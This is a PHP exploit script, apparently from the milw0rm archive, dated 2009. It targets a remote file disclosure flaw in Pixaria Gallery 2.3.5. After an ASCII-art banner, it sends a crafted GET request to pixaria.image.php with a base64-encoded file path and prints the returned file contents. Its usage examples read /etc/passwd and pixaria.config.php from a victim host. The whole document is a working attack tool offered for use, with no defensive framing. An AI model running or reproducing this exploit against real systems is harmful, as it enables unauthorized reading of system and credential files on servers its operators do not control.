<?php
ini_set("max_execution_time",0);
print_r('
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .

                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
[q] Pixaria Gallery 2.3.5          __/QQQ/````````````````\QQQ\___
  Remote File Disclosure         _/QQQQQ/                  \QQQQQQ\
[q] _GET   <3                   /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
[q] http://pixaria.com        |QQQQ/    By  Qabandi             \QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
[/]   -[hai]-                  \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                         ```````````````````     `````
 ______________________________________________________________________________
/                                                                              \
|                          meh.....                                            |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
');

if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage:   php '.$argv[0].' VICTIM DIR FILE

example: php '.$argv[0].' EXAMPLE /demo/ /etc/passwd

or if in root dir:
example: php '.$argv[0].' EXAMPLE // /etc/passwd
php '.$argv[0].' EXAMPLE // ./pixaria.config.php
-----------------------------------------------------------------------------
');
die;
}
 function QABANDI($victim,$vic_dir,$file){
$host = $victim;
$p = "http://".$host.$vic_dir;


$file2 = base64_encode($file);

          $packet ="GET ".$p."/pixaria.image.php?file=".$file2." HTTP/1.0\r\n";
          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
          $packet.="Pragma: no-cache\r\n";
          $packet.="Connection: Close\r\n\r\n";

	$o = @fsockopen($host, 80);
	if(!$o){
		echo "\n[x] No response...\n";
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
	if ( !empty($_404) ){
		echo "\n[x] 404 Not Found... Make sure of path. \n";
		die;
	}

                                           return $data;

 }

$host1 = $argv[1];
$userdir1=$argv[2];
$file= $argv[3];







if ($argc > 2) {
  

echo "Getting file Data....[i9bir]\n";
print_r(QABANDI($host1,$userdir1,$file));


}
?>

# milw0rm.com [2009-07-24]
